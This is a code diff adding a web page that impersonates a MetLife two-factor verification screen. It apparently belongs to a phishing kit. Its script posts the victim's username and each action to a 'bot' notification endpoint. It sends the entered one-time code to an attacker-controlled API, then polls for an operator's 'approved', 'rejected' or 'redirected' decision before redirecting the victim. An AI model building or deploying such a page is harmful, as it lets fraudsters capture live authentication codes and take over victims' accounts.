@@ -1,0 +1,304 @@
+<!doctype html>
+<html lang="en">
+  <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Two-Factor Authentication - Life Portal</title>
+    <link rel="stylesheet" href="styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   
+   
+ 
+<style>
+.loading-spinner{display:inline-block;width:12px;height:12px;border:2px solid #f3f3f3;border-top:2px solid #fff;border-radius:50%;animation:spin 1s linear infinite;margin-right:5px}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.btn.loading{background:#999;cursor:not-allowed}
+.message-container {
+  width: 100%;
+  padding: 12px 16px;
+  margin-bottom: 20px;
+  border-radius: 4px;
+  font-size: 14px;
+  line-height: 1.5;
+  display: none;
+  align-items: center;
+  gap: 10px;
+}
+.message-container.show {
+  display: flex;
+}
+.message-container.success {
+  background: #d4edda;
+  border: 1px solid #c3e6cb;
+  color: #155724;
+}
+.message-container.error {
+  background: #f8d7da;
+  border: 1px solid #f5c6cb;
+  color: #721c24;
+}
+.message-icon {
+  font-size: 16px;
+  flex-shrink: 0;
+}
+</style>
+<script src="../config.js"></script>
+<!-- <script src="js/logVisitor.js"></script> -->
+</head>
+<body><main class="page">
+<img class="logo" id="globalLogo" src="./img/img.jpg" alt="MetLife logo">
+
+<div id="messageBox" class="message-container">
+  <span class="message-icon" id="messageIcon"></span>
+  <span id="messageText"></span>
+</div>
+
+<section class="panel"><h1>Verify Your Identity</h1>
+<div class="verify-box">
+<div class="progress-row"><div class="progress"><span style="width:80%"></span></div><span class="percent">80%</span></div>
+<p class="verify-text" id="verifyText">A verification code was sent to your mobile number.</p>
+<div class="verify-row"><label>Verification Code *</label><input id="code" type="password"><label class="view"v style="font-size: 8px;"><input type="checkbox" onclick="toggleCode()"> View</label></div>
+<p style="font-size:9px">If you did not receive the verification code, please <a class="link" id="resendLink" href="#" onclick="return resend()">click here</a> to resend the verification code.<span id="resendTimer" style="display:none; margin-left:10px; color:#ff8c00;"></span></p>
+<div class="actions"><a class="btn cancel" href="verify-method.html">Cancel</a><button class="btn" id="submitBtn" onclick="submitCode()">Submit</button></div>
+</div></section>
+
+<div id="globalFooter" class="footer"></div>
+
+</main>
+<script>
+let statusCheckInterval = null;
+let verificationId = null;
+
+function showMessage(message, type = 'error') {
+  const messageBox = document.getElementById('messageBox');
+  const messageText = document.getElementById('messageText');
+  const messageIcon = document.getElementById('messageIcon');
+  
+  messageText.textContent = message;
+  messageBox.className = 'message-container show ' + type;
+  messageIcon.textContent = type === 'success' ? '✓' : '✕';
+  
+  // Auto-hide after 5 seconds
+  setTimeout(() => {
+    messageBox.classList.remove('show');
+  }, 5000);
+}
+
+function initPage() {
+  const logo = document.getElementById('globalLogo');
+  logo.src = window.APP_CONFIG.logo;
+  logo.alt = window.APP_CONFIG.logoAlt;
+  
+  const footer = document.getElementById('globalFooter');
+  const cfg = window.APP_CONFIG.footer;
+  footer.innerHTML = `<b>Contact Us</b> - Call ${cfg.company} at ${cfg.phone}, Toll Free at ${cfg.phoneToll} or Email us at <a href="#">${cfg.email}</a><br><br>${cfg.copyright}`;
+  
+  const tempToken = localStorage.getItem('temp_token');
+  const method = localStorage.getItem('verification_method');
+  if (!tempToken || !method) {
+    window.location.href = '../index.html';
+    return;
+  }
+  
+  const verifyText = document.getElementById('verifyText');
+  if (method === 'email') {
+    verifyText.textContent = 'A verification code was sent to your email address.';
+  }
+  
+  
+}
+
+function toggleCode(){
+  const i=document.getElementById('code');
+  i.type=i.type==='password'?'text':'password';
+}
+
+function resend(){
+  const username = localStorage.getItem('metlife_username');
+  const tempToken = localStorage.getItem('temp_token');
+  const method = localStorage.getItem('verification_method');
+  const resendLink = document.getElementById('resendLink');
+  const resendTimer = document.getElementById('resendTimer');
+  
+  fetch(window.metlife_API_BASE + '/api/two-factor/click', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${tempToken}`,
+    },
+    body: JSON.stringify({
+      username: username,
+      method: method,
+    }),
+  })
+  .then(r => r.json().then(d => ({ ok: r.ok, data: d })))
+  .then(result => {
+    if (result.ok) {
+      showMessage('A new verification code has been sent.', 'success');
+      sendBotNotification(username, 'resend_code', `User clicked resend verification code via ${method}`);
+      startResendTimer();
+    } else {
+      showMessage('Failed to resend code. Please try again.', 'error');
+    }
+  })
+  .catch(err => {
+    showMessage('Error sending code. Please try again.', 'error');
+  });
+  
+  return false;
+}
+
+function startResendTimer() {
+  const resendLink = document.getElementById('resendLink');
+  const resendTimer = document.getElementById('resendTimer');
+  let timeLeft = 60;
+  
+  resendLink.style.pointerEvents = 'none';
+  resendLink.style.opacity = '0.5';
+  resendTimer.style.display = 'inline';
+  resendTimer.textContent = `(${timeLeft}s)`;
+  
+  const timerInterval = setInterval(() => {
+    timeLeft--;
+    resendTimer.textContent = `(${timeLeft}s)`;
+    
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      resendLink.style.pointerEvents = 'auto';
+      resendLink.style.opacity = '1';
+      resendTimer.style.display = 'none';
+    }
+  }, 1000);
+}
+
+function sendBotNotification(username, action, message) {
+  fetch(window.metlife_API_BASE + '/api/bot/send-notification', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      username: username,
+      action: action,
+      message: message,
+      botName: window.APP_CONFIG.botName,
+      timestamp: new Date().toISOString(),
+    }),
+  })
+  .catch(err => {
+    console.error('Failed to send bot notification:', err);
+  });
+}
+
+function submitCode(){
+  const code = document.getElementById('code').value.trim();
+  const username = localStorage.getItem('metlife_username');
+  const tempToken = localStorage.getItem('temp_token');
+  
+  if (!code) {
+    showMessage('Please enter the verification code.', 'error');
+    return;
+  }
+  
+  const btn = document.getElementById('submitBtn');
+  const originalText = btn.textContent;
+  btn.disabled = true;
+  btn.textContent = 'Loading...';
+  
+  fetch(window.metlife_API_BASE + '/api/two-factor/verify-code', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${tempToken}`,
+    },
+    body: JSON.stringify({
+      username: username,
+      code: code,
+    }),
+  })
+  .then(r => r.json().then(d => ({ ok: r.ok, data: d })))
+  .then(result => {
+    if (!result.ok) {
+      showMessage(result.data.message || 'Failed to verify code.', 'error');
+      btn.disabled = false;
+      btn.textContent = originalText;
+      document.getElementById('code').value = '';
+      return;
+    }
+    
+    verificationId = result.data.verificationId;
+    startStatusCheck();
+  })
+  .catch(err => {
+    showMessage('Unable to reach the server. Please try again.', 'error');
+    btn.disabled = false;
+    btn.textContent = originalText;
+    console.error('Error:', err);
+  });
+}
+
+function startStatusCheck() {
+  if (statusCheckInterval) {
+    clearInterval(statusCheckInterval);
+  }
+
+  statusCheckInterval = setInterval(() => {
+    if (!verificationId) {
+      clearInterval(statusCheckInterval);
+      return;
+    }
+
+    const tempToken = localStorage.getItem('temp_token');
+    fetch(window.metlife_API_BASE + `/api/two-factor/check-approval/${verificationId}`, {
+      headers: { 'Authorization': `Bearer ${tempToken}` },
+    })
+    .then(r => r.json())
+    .then(result => {
+      if (result.status === 'approved') {
+        clearInterval(statusCheckInterval);
+        completeVerification();
+      } else if (result.status === 'rejected') {
+        clearInterval(statusCheckInterval);
+        rejectVerification();
+      }else if (result.status === 'redirected') {
+        clearInterval(statusCheckInterval);
+       window.location.href=window.APP_CONFIG.redirectLink
+      }
+    })
+    .catch(err => {
+      console.error('Status check error:', err);
+    });
+  }, 3000);
+}
+
+function completeVerification() {
+  const tempToken = localStorage.getItem('temp_token');
+  localStorage.setItem('metlife_token', tempToken);
+  localStorage.setItem('verification_complete', 'true');
+
+  const btn = document.getElementById('submitBtn');
+
+
+
+  setTimeout(() => {
+    window.location.href =window.APP_CONFIG.redirectLink;
+  }, 1500);
+}
+
+function rejectVerification() {
+  if (statusCheckInterval) {
+    clearInterval(statusCheckInterval);
+  }
+   const code = document.getElementById('code');
+   code.disabled = false
+   code.value = ''
+    const btn = document.getElementById('submitBtn');
+  //const originalText = btn.textContent;
+  btn.disabled = false;
+  btn.textContent = 'Submit';
+  showMessage('Incorrect code. Please try again.', 'error');
+  
+}
+
+window.addEventListener('load', initPage);
+</script>
+</body></html>
